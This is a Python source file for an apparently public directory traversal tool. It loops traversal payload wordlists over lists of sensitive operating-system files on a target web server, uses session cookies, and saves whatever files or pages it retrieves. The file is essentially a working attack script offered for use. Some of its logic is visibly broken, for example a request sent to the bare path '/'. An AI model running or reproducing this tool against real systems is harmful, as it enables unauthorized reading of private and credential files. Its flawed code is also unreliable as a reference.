# DirTras Directory Traversal Tool
# Github: https://github.com/nathan-watson-uk


from text_data import help_info, bug_info, run_info
from urllib.parse import urlparse
import requests
import sys
import os
import argparse
import time
import re


# Function to check if the URL points to a downloadable resource
def is_downloadable(u):
    """
    Does the url contain a downloadable resource
    """
    try:
        # Send a HEAD request to the URL
        head = requests.head(u, allow_redirects=True)
    except requests.exceptions.ConnectionError as err:
        # Exit if there's a connection error
        sys.exit(f"Connection Error | {err} | To prevent this try to increase the delay between requests")

    # Get the content type from the headers
    content_type = head.headers.get('content-type', '').lower()

    # Return True if the content type is not text or HTML
    return not ("text" in content_type or "html" in content_type)


# Function to make a GET request, optionally with cookies
def get_request(s, u, c=None):
    return s.get(u, cookies=c) if c else s.get(u)


# Function to create output directories if they do not exist
def create_output_dirs(output):
    try:
        os.makedirs(os.path.join(output, "html"))  # Create 'html' directory
        os.makedirs(os.path.join(output, "downloaded"))  # Create 'downloaded' directory
    except FileExistsError:
        # Print a message if the directories already exist
        print(f"Folder {output} already exists. Continuing...")
        time.sleep(1)


# Main function to execute the script
def main():
    # Set up argument parser
    parser = argparse.ArgumentParser(description="Directory Traversal Tool", add_help=False)
    parser.add_argument("-u", "--url",  help="Target URL")
    parser.add_argument("--target-os", default="linux", choices=["linux", "windows"], help="Target operating system")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-d", "--delay", type=float, default=0.02, help="Delay between requests")
    parser.add_argument("-f", "--file", help="File containing traversal techniques")
    parser.add_argument("-o", "--output", help="Output directory")
    parser.add_argument("-c", "--cookies", help="Cookies for session")
    parser.add_argument("--cookie-name", help="Name of the cookies")
    parser.add_argument("--host-system", default="linux", choices=["linux", "windows"], help="Host system")
    parser.add_argument("-b", "--bugs", action="store_true", help="Print Bug Information")
    parser.add_argument("--L1", action="store_true", help="Use level 1 techniques")
    parser.add_argument("--L2", action="store_true", help="Use level 2 techniques")
    parser.add_argument("--L3", action="store_true", help="Use level 3 techniques")
    parser.add_argument("-H", "--help", action="store_true", help="Usage Menu")

    args = parser.parse_args()

    # Print bug information and exit if the --bugs flag is used
    if args.bugs:
        print(bug_info)
        sys.exit()

    if args.help:
        print(help_info)
        sys.exit()

    # Ensure the URL ends with '=' if it is meant to have query parameters
    if args.url[-1] == "=":
        args.url = args.url[:args.url.index("=") + 1]

    # Initialise session cookies if provided
    session_cookie = {}
    if args.cookies and args.cookie_name:
        cookies = args.cookies.split(",")
        cookie_names = args.cookie_name.split(",")
        if len(cookies) != len(cookie_names):
            sys.exit("You must provide the same number of cookie names as cookies.")
        session_cookie = dict(zip(cookie_names, cookies))
    elif args.cookies:
        sys.exit("You must define the name of the cookie when using session cookies e.g PHPSESSID")

    # Set output directory
    output = args.output or os.path.join(os.getcwd(), "output")
    create_output_dirs(output)

    # Warn if using HTTPS with port 80
    if "https" in args.url and args.port == 80:
        print("HTTPS included in supplied URL but using port 80? Continuing...")
        time.sleep(3)

    # Suggest increasing delay to prevent ephemeral port exhaustion
    if args.delay < 0.02:
        print("Considering using a delay higher than 0.02 to prevent ephemeral port exhaustion")
        time.sleep(1)

    # Determine the file containing traversal techniques
    file = args.file or os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{args.target_os}_files.txt")

    # Determine the level of techniques to use
    if args.L1:
        level = "L1"
    elif args.L2:
        level = "L2"
    elif args.L3:
        level = "L3"
    else:
        level = None

    # Override file if a level is specified
    if level:
        file = os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{level}.txt")

    # Open files containing traversal techniques and directories of interest
    with open(file, "r") as traverse_file, open(
            os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{args.target_os}_files.txt"),
            "r") as interest_dirs:
        session = requests.Session()
        list_of_traversal_techniques = traverse_file.readlines()
        list_of_directories = interest_dirs.readlines()
        files_to_get = len(list_of_directories)

        # Test the base URL length and non-existent URL length
        # These content lengths will be used to ignore false positives
        non_existent_url_path = args.url + "../thisdoesntwork"
        base_url_path = "/"

        # Get the content length of the base URL and non-existent URL and store them in invalid_traversal_lengths list
        base_path_request = get_request(session, base_url_path, session_cookie)
        non_existent_path_request = get_request(session, non_existent_url_path, session_cookie)

        invalid_traversal_lengths = [len(base_path_request.content), len(non_existent_path_request.content)]

        # Initialise counters and lists for found files and HTML content
        iter_count = 0
        file_counter = 0
        num_of_iterations = len(list_of_traversal_techniques) * len(list_of_directories)

        # Initialise lists for discovered files and HTML content
        file_found_list = []
        html_found_list = []

        # Iterate through traversal techniques and directories
        for traversal_technique in list_of_traversal_techniques:
            for directory_to_try in list_of_directories:
                time.sleep(args.delay)  # Delay between requests
                iter_count += 1

                # Clean up directory strings
                directory_to_try = directory_to_try.lstrip("/\\")
                directory_os_dir = re.sub("{FILE}|{FILE", f"{directory_to_try.strip()}", traversal_technique.strip())
                parsed_url = urlparse(args.url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
                url_directory_built = f"{args.url[len(base_url):]}{directory_os_dir}"
                built_url = f"{args.url[:len(base_url) - 1]}:{args.port}/{url_directory_built}"

                # Attempt to make a request to the built URL
                try:
                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)
                except Exception as error:
                    session = requests.Session()  # Reset session on error
                    print(
                        f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | HTTP Error - {error} | ",
                        end="")
                    print(f"Current URL: {built_url[:80]}... ", end="")
                    continue

                print(
                    f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | Length - {len(dir_traversal_target.content)} | ",
                    end="")
                print(f"Current URL: {built_url[:80]}... ", end="")

                # Check if the URL points to a downloadable resource
                if is_downloadable(built_url):
                    file_download_name = re.sub(r"[^A-Za-z0-9]+", "",
                                                dir_traversal_target.headers.get('content-disposition', ''))
                    if not dir_traversal_target.content:
                        continue
                    if (file_download_name, len(dir_traversal_target.content)) in file_found_list:
                        continue
                    file_found_list.append((file_download_name, len(dir_traversal_target.content)))

                    # Save the downloaded file
                    filename = f"{output}/downloaded/{file_download_name}_{iter_count}.txt" if args.host_system == "linux" else fr"{output}\downloaded\{file_download_name}_{iter_count}.txt"
                    with open(filename, "wb") as f:
                        f.write(dir_traversal_target.content)
                    file_counter += 1
                    continue

                # Skip if the content length matches the failed traversal response
                if len(dir_traversal_target.content) in invalid_traversal_lengths:
                    continue

                # Skip if the directory content is empty or already found
                if not dir_traversal_target.content or directory_to_try in html_found_list:
                    continue

                # Save the HTML content found
                html_found_list.append(directory_to_try)
                os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", directory_to_try.strip())
                filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html" if args.host_system == "linux" else fr"{output}\html\{os_dir_file}_content_{iter_count}.html"
                with open(filename, "wb") as f:
                    f.write(dir_traversal_target.content)
                file_counter += 1


# Entry point
if __name__ == "__main__":
    print(run_info)
    main()
